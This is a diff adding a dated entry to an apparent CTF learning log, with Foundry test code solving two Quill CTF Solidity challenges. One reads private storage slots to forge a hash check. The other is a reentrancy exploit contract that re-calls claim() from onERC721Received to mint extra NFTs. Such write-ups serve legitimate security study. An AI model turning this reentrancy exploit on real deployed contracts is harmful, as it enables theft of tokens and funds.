@@ -809,4 +809,75 @@ contract VIPBankExploit{
 }
 ```
 
+### 2024.09.10
+
+- Quill CTF: Confidential Hash
+- Quill CTF: Safe NFT
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Test, console} from "forge-std/Test.sol";
+import {Confidential} from "../src/confidentialHash.sol";
+import {safeNFT} from "../src/safeNFT.sol";
+import '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';
+
+contract CounterTest2 is Test {
+    Confidential public confidential;
+    safeNFT public nft;
+
+
+    function setUp() public {
+        confidential = new Confidential();
+        nft = new safeNFT("safe", "safe", 0.01 ether);
+    }
+
+    function test_solve_confidential() public {
+        bytes32 alice = vm.load(address(confidential), bytes32(uint256(4)));
+        bytes32 bob = vm.load(address(confidential), bytes32(uint256(9)));    
+        bytes32 mhash = keccak256(abi.encodePacked(alice, bob));
+        confidential.checkthehash(mhash);
+    }
+
+    function test_solve_nft() public {
+        SafeNFTExploit sne = new SafeNFTExploit(nft);
+        sne.exploit{value: 0.01 ether}();
+        assert( nft.balanceOf(address(sne)) > 1);
+    }
+
+}
+
+contract SafeNFTExploit is IERC721Receiver{
+
+  safeNFT private nft;
+  uint256 breaker;
+
+  constructor(safeNFT _nft ) {
+    nft = _nft;
+  }
+
+  function exploit() external payable {
+    nft.buyNFT{value: msg.value}();
+    nft.claim();
+  }
+
+
+  function onERC721Received(
+    address operator,
+    address from,
+    uint256 tokenId,
+    bytes calldata 
+  ) external override returns (bytes4) {
+
+    if(breaker == 0){
+        breaker += 1;
+        nft.claim();
+    }
+    
+    return IERC721Receiver.onERC721Received.selector;
+  }
+}
+```
+
 <!-- Content_END -->
